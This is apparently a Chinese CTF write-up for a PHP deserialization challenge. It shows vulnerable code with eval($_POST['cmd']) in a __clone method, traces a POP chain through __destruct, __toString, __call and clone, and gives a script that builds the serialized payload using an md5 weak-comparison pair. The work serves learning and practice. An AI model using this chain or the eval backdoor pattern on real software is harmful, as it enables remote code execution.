+++
title = 'SICTF 我全都要！'
date = '2023-09-12T15:03:49+08:00'
categories = ['刷题', '学习', '比赛']
tags = ['php反序列化']
+++

## 考点

1.反序列化

2.pop链

3.clone关键字和clone()魔术方法

## 解题过程

### 分析代码

```
<?php
highlight_file(__FILE__);

class B{
    public $pop;
    public $i;
    public $nogame;

    public function __destruct()
    {
        if(preg_match("/233333333/",$this->pop)){//pop->A
            echo "这是一道签到题，不能让新生一直做不出来遭受打击";
        }
    }

    public function game(){
        echo "扣1送地狱火";
        if ($this->i = "1"){
            echo '<img src=\'R.jpg\'>';
            $this->nogame->love();//->call  nogame->P  2
        }
    }
    public function __clone(){
        echo "必须执行";
        eval($_POST["cmd"]);
    }
}
class A{
    public $Aec;
    public $girl;
    public $boy;

    public function __toString()
    {
        echo "I also want to fall in love";
        if($this->girl != $this->boy && md5($this->girl) == md5($this->boy)){
            $this->Aec->game();//Aec->B   1
        }
    }
}
class P{
    public $MyLover;
    public function __call($name, $arguments)
    {
        echo "有对象我会在这打CTF???看我克隆一个对象！";
        if ($name != "game") {
            echo "打游戏去，别想着对象了";
            $this->MyLover = clone new B;//MyLover->B
        }
    }
}
if ($_GET["A_B_C"]){
    $poc=$_GET["A_B_C"];
    unserialize($poc);
}
```

### clone关键字和__clone()魔术方法：

php中clone关键字用于复制一个对象

![image-20230911201656173](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309112016203.png)

如上图所述，当使用clone关键字拷贝一个对象后，如果对象存在__clone()魔术方法，就会自动调用。

### 分析pop链：

这里反向去推，找最后的点，也就是

```
    public function __clone(){
        echo "必须执行";
        eval($_POST["cmd"]);
    }
```

要执行__clone()魔术方法，就要copy对象，后面正好有一个copy对象的clone关键字，$this->MyLover = clone new B;//MyLover->B，这里是P类中的call()魔术方法，调用不存在的方法时会调用call()魔术方法，B类中的game()方法里面 $this->nogame->love()，这里调用了一个不存在的方法，然后再看哪里可以去触发game()方法，A类中的tostring()魔术方法触发了game()方法，然后去找如何触发tostring()魔术方法，

```
class B{
    public function __destruct()
    {
      public $pop;
        if(preg_match("/233333333/",$this->pop)){//pop->A
            echo "这是一道签到题，不能让新生一直做不出来遭受打击";
        }
    }
```

这里看到对pop进行了正则匹配，而正则匹配是可以触发tostring()方法的，再理清一下

B->pop ->A ->Aec->B->nogame->P,大概就是这条链子，中间还有一个md5的若比较以及一些小的细节，

### pop

```
<?php

class B{
   // public $pop=new A;
    public $i='1';//有无都可以
    public $nogame;
}

class A{
    public $Aec;
    public $girl="s878926199a";
    public $boy="s155964671a";
}
class P{
}
$a=new B;
$a->pop=new A;//tostring

$a->pop->Aec=new B;
$a->pop->Aec->nogame=new P('game','game');

echo serialize($a);

```

## 结语：

一道简单的php反序列化，这里了解到了php中的clone关键字和__clone()魔术方法。
